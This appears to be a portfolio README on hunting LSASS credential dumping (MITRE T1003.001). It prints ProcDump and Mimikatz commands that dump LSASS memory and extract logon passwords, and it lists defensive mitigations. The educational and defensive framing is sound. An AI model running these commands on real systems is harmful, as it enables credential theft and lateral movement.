
# Cybersecurity Portfolio: Threat Hunting and Credential Dumping Demo

Welcome to my cybersecurity portfolio repository! This project focuses on **Threat Hunting** techniques, specifically **OS Credential Dumping** using the MITRE ATT&CK framework.

## Project Overview

**Topic:** Threat Hunting - Credential Dumping from LSASS Memory  
**Technique ID:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)  
**Tool Demonstrations:**
- **ProcDump**: Creating memory dumps of the LSASS process.
- **Mimikatz**: Extracting credentials from memory dumps.

---

## Demo Details

### 1. Dumping LSASS Memory with ProcDump
```bash
procdump -ma lsass.exe lsass_dump.dmp
```
- This command creates a full memory dump of the LSASS process.

### 2. Analyzing the Dump with Mimikatz
```bash
sekurlsa::Minidump lsass_dump.dmp
sekurlsa::logonPasswords
```
- These commands load the LSASS dump and extract user credentials.

---

## Why This Matters
- Attackers use credential dumping to perform **lateral movement** and escalate privileges.
- Knowing how this technique works helps defenders **detect**, **prevent**, and **respond** faster to threats.

---

## Mitigations
- **Credential Guard**: Protect LSASS secrets with Windows Defender Credential Guard.
- **ASR Rules**: Enable Attack Surface Reduction rules to block LSASS memory access.
- **Active Directory Hardening**: Secure domain controller replication permissions.
- **Password Policies**: Use unique, complex local administrator passwords.

---

## Tools Used
- [ProcDump - Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)

---

## About Me
I am passionate about cybersecurity, threat detection, and digital forensics. This repository is part of my ongoing portfolio to showcase hands-on cybersecurity skills.

Feel free to connect and check out more of my projects!

---

## Disclaimer
**This repository is for educational purposes only.** Always perform security testing in isolated, controlled environments and never without permission.

---

# Thank you for visiting my cybersecurity portfolio! :shield:
